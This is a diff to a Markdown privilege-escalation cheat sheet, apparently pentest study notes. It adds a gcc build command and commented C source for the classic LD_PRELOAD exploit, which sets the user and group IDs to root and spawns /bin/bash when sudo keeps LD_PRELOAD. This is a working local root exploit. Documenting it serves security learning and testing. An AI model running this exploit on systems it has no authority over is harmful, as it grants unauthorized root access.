@@ -14,16 +14,30 @@ You can use ```https://gtfobins.org/``` to check what applications might bypass 
 ### LD_PRELOAD
 Using **sudo -l** you an option may be avaiable called ```env_keep+=LD_PRELOAD``` which is another possible priviledge escalation.
 
+
+Complie this text as a shared extension
+**gcc -fPIC -shared -o Exploit.so Exploit.c -nostartfiles**
+
+*-fPIC	Generates Position-Independent Code required for shared libraries.*
+*-shared	Produces a shared object (.so) instead of an executable.*
+*-o Exploit.so	Specifies the output filename.*
+*Exploit.c	The source file.*
+*-nostartfiles	Prevents standard startup routines so _init() executes immediately.*
+
+
+
+Name *Exploit*
 ```
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
+#include <unistd.h>
 
 void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/bash");
+    unsetenv("LD_PRELOAD");  // Prevent recursive loading
+    setgid(0);               // Set group ID to root
+    setuid(0);               // Set user ID to root
+    system("/bin/bash");     // Spawn a root shell
 }
 ```
 
